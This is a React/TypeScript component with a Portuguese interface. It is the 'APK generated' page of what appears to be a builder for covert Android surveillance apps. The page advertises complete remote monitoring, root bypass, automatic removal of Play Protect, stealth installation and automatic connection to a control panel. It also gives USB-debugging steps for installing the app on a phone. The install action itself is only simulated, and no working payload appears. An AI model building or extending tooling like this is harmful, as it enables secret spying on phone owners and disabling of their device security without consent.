import { useEffect, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Smartphone, Download, CheckCircle, ArrowLeft } from "lucide-react";

export default function APKPanel() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  
  const logo = searchParams.get('logo') || '';
  const name = searchParams.get('name') || '';
  const url = searchParams.get('url') || '';
  const buildId = searchParams.get('buildId') || '';

  const [isInstalling, setIsInstalling] = useState(false);

  const handleInstallOnPhone = async () => {
    setIsInstalling(true);
    
    // Simulate installation process
    setTimeout(() => {
      setIsInstalling(false);
      alert('APK instalado com sucesso no dispositivo!');
    }, 3000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-blue-950 to-slate-950 p-6">
      <div className="max-w-4xl mx-auto">
        <div className="mb-6">
          <Button
            onClick={() => navigate('/apk-builder')}
            variant="outline"
            className="border-cyan-400/30 text-cyan-300 hover:bg-cyan-900/20"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Voltar ao Builder
          </Button>
        </div>

        <h1 className="text-4xl font-bold text-cyan-300 mb-2">🎉 APK Gerado com Sucesso!</h1>
        <p className="text-slate-400 mb-8">Seu aplicativo personalizado está pronto</p>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* App Details */}
          <Card className="bg-slate-900/50 backdrop-blur-xl border-cyan-400/30 p-8">
            <h2 className="text-2xl font-bold text-cyan-300 mb-6">📱 Detalhes do App</h2>

            <div className="space-y-6">
              <div className="flex items-center space-x-4">
                <img
                  src={logo}
                  alt="Logo"
                  className="w-16 h-16 rounded-lg object-contain border-2 border-cyan-400/50"
                  onError={(e) => {
                    (e.target as HTMLImageElement).src = "https://via.placeholder.com/64";
                  }}
                />
                <div>
                  <h3 className="text-xl font-bold text-white">{name}</h3>
                  <p className="text-cyan-300 text-sm">{url}</p>
                </div>
              </div>

              <div className="bg-slate-800/50 border border-cyan-400/30 rounded-lg p-4">
                <h4 className="text-sm font-semibold text-cyan-300 mb-3">Funcionalidades Incluídas:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>✅ Monitoramento remoto completo</li>
                  <li>✅ Bypass Root completo</li>
                  <li>✅ Desinstalação automática do Play Protect</li>
                  <li>✅ Instalação stealth</li>
                  <li>✅ Conexão automática ao painel</li>
                </ul>
              </div>

              <div className="bg-green-900/20 border border-green-400/30 rounded-lg p-4">
                <div className="flex items-center space-x-2 mb-2">
                  <CheckCircle className="w-5 h-5 text-green-400" />
                  <span className="text-green-300 font-semibold">APK Pronto!</span>
                </div>
                <p className="text-sm text-slate-300">
                  Build ID: <code className="bg-slate-800 px-2 py-1 rounded text-xs">{buildId}</code>
                </p>
              </div>
            </div>
          </Card>

          {/* Installation */}
          <Card className="bg-slate-900/50 backdrop-blur-xl border-cyan-400/30 p-8">
            <h2 className="text-2xl font-bold text-cyan-300 mb-6">📲 Instalação no Celular</h2>

            <div className="space-y-6">
              <div className="text-center">
                <Smartphone className="w-16 h-16 text-cyan-400 mx-auto mb-4" />
                <p className="text-slate-300 mb-4">
                  Clique no botão abaixo para instalar automaticamente no dispositivo conectado
                </p>
              </div>

              <Button
                onClick={handleInstallOnPhone}
                disabled={isInstalling}
                className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold py-4 rounded-lg disabled:opacity-50"
              >
                {isInstalling ? (
                  <>
                    <div className="animate-spin inline-block mr-2 w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
                    Instalando...
                  </>
                ) : (
                  <>
                    <Smartphone className="w-5 h-5 mr-2" />
                    📱 Instalar no Celular
                  </>
                )}
              </Button>

              <div className="bg-slate-800/50 border border-cyan-400/30 rounded-lg p-4">
                <h4 className="text-sm font-semibold text-cyan-300 mb-3">Como Funciona:</h4>
                <ol className="space-y-2 text-sm text-slate-300">
                  <li>1. Conecte seu celular via USB</li>
                  <li>2. Ative depuração USB</li>
                  <li>3. Clique em "Instalar no Celular"</li>
                  <li>4. O app será instalado automaticamente</li>
                  <li>5. Play Protect será desinstalado</li>
                  <li>6. Root bypass ativado</li>
                </ol>
              </div>

              <div className="text-center">
                <Button
                  variant="outline"
                  className="border-cyan-400/30 text-cyan-300 hover:bg-cyan-900/20"
                >
                  <Download className="w-4 h-4 mr-2" />
                  Download Manual
                </Button>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
}